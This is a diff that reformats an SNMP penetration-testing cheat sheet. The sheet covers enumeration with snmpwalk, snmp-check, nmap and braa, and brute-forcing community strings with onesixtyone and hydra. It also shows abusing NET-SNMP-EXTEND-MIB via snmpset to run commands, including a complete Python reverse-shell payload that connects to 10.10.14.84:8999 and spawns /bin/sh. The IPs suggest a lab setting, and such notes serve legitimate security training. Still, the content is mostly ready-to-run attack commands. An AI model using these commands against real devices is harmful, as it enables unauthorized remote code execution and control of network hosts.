@@ -38,37 +38,37 @@
 
 ### It is recommanded to install the following to see whats does mean each OID gathered from the device:
 
- - apt-get install snmp-mibs-downloader
+    apt-get install snmp-mibs-downloader
 
- - download-mibs
+    download-mibs
 
 # Finally comment the line saying "mibs :" in /etc/snmp/snmp.conf
 
- - sudo vi /etc/snmp/snmp.conf
+    sudo vi /etc/snmp/snmp.conf
 
 ### If you know a valid community string, you can access the data using SNMPWalk or SNMP-Check:
 
- - snmpbulkwalk -c [COMM_STRING] -v [VERSION] [IP] . #Don't forget the final dot
+    snmpbulkwalk -c [COMM_STRING] -v [VERSION] [IP] . #Don't forget the final dot
 
- - snmpbulkwalk -c public -v2c 10.10.11.136 .
+    snmpbulkwalk -c public -v2c 10.10.11.136 .
 
- - snmpwalk -v [VERSION_SNMP] -c [COMM_STRING] [DIR_IP]
+    snmpwalk -v [VERSION_SNMP] -c [COMM_STRING] [DIR_IP]
 
- - snmpwalk -v [VERSION_SNMP] -c [COMM_STRING] [DIR_IP] 1.3.6.1.2.1.4.34.1.3 #Get IPv6, needed dec2hex
+    snmpwalk -v [VERSION_SNMP] -c [COMM_STRING] [DIR_IP] 1.3.6.1.2.1.4.34.1.3 #Get IPv6, needed dec2hex
 
- - snmpwalk -v [VERSION_SNMP] -c [COMM_STRING] [DIR_IP] NET-SNMP-EXTEND-MIB::nsExtendObjects #get extended
+    snmpwalk -v [VERSION_SNMP] -c [COMM_STRING] [DIR_IP] NET-SNMP-EXTEND-MIB::nsExtendObjects #get extended
 
- - snmpwalk -v [VERSION_SNMP] -c [COMM_STRING] [DIR_IP] .1 #Enum all
+    snmpwalk -v [VERSION_SNMP] -c [COMM_STRING] [DIR_IP] .1 #Enum all
 
- - snmp-check [DIR_IP] -p [PORT] -c [COMM_STRING]
+    snmp-check [DIR_IP] -p [PORT] -c [COMM_STRING]
 
- - nmap --script "snmp* and not snmp-brute" <target>
+    nmap --script "snmp* and not snmp-brute" <target>
 
- - braa <community string>@<IP>:.1.3.6.* #Bruteforce specific OID
+    braa <community string>@<IP>:.1.3.6.* #Bruteforce specific OID
 
 ### Thanks to extended queries (download-mibs), it is possible to enumerate even more about the system with the following command :
 
- - snmpwalk -v X -c public <IP> NET-SNMP-EXTEND-MIB::nsExtendOutputFull
+    snmpwalk -v X -c public <IP> NET-SNMP-EXTEND-MIB::nsExtendOutputFull
 
 ### SNMP has a lot of information about the host and things that you may find interesting are:
 
@@ -132,13 +132,13 @@
 
 ### To extend SNMP services and add extra commands, it is possible to append new rows to the "nsExtendObjects" table. This can be achieved by using the snmpset command and providing the necessary parameters, including the absolute path to the executable and the command to be executed:
 
-snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c c0nfig localhost \
+    snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c c0nfig localhost \
 
-'nsExtendStatus."evilcommand"' = createAndGo \
+    'nsExtendStatus."evilcommand"' = createAndGo \
 
-'nsExtendCommand."evilcommand"' = /bin/echo \
+    'nsExtendCommand."evilcommand"' = /bin/echo \
 
-'nsExtendArgs."evilcommand"' = 'hello world'
+    'nsExtendArgs."evilcommand"' = 'hello world'
 
 #### 2) Injecting commands for execution
 
@@ -156,26 +156,26 @@ snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c c0nfig localhost \
 
 ### Alternatively, a reverse shell can be manually created by injecting a specific command into SNMP. This command, triggered by the snmpwalk, establishes a reverse shell connection to the attacker's machine, enabling control over the victim machine. You can install the pre-requisite to run this:
 
- - sudo apt install snmp snmp-mibs-downloader rlwrap -y
+    sudo apt install snmp snmp-mibs-downloader rlwrap -y
 
- - git clone https://github.com/mxrch/snmp-shell
+    git clone https://github.com/mxrch/snmp-shell
 
- - cd snmp-shell
+    cd snmp-shell
 
- - sudo python3 -m pip install -r requirements.txt
+    sudo python3 -m pip install -r requirements.txt
 
 ### Or a reverse shell
 
- - snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 10.129.2.26 'nsExtendStatus."command10"' = createAndGo 'nsExtendCommand."command10"' = /usr/bin/python3.6 'nsExtendArgs."command10"' = '-c "import sys,socket,os,pty;s=socket.socket();s.connect((\"10.10.14.84\",8999));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")"'
+    snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 10.129.2.26 'nsExtendStatus."command10"' = createAndGo 'nsExtendCommand."command10"' = /usr/bin/python3.6 'nsExtendArgs."command10"' = '-c "import sys,socket,os,pty;s=socket.socket();s.connect((\"10.10.14.84\",8999));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")"'
 
 ## Crack SNMP Passwords
 
- - onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt {IP} -w 100
+    onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt {IP} -w 100
 
- - hydra -P {Big_Passwordlist} -v {IP} snmp
+    hydra -P {Big_Passwordlist} -v {IP} snmp
 
 ## Enumerate SNMP 
 
- - snmp-check {IP}
+    snmp-check {IP}
 
- - nmap --script "snmp* and not snmp-brute" {IP}
+    nmap --script "snmp* and not snmp-brute" {IP}
